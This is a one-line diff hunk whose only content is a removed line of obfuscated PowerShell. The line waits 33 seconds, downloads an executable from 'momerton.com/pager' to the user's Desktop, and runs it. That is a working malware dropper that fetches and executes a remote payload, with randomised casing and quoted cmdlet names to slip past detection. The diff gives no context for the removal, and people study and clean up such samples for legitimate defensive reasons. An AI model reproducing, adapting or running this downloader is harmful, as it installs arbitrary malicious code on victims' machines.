@@ -1,1 +1,0 @@
-$7d0mK6 = [TypE]'EnVIronMENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfolDeRPaTH('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLOadFiLE.iNVoKE('http://momerton.com/pager','$Des\3748654.exe');&'Start-Process' $Des\3748654.exe
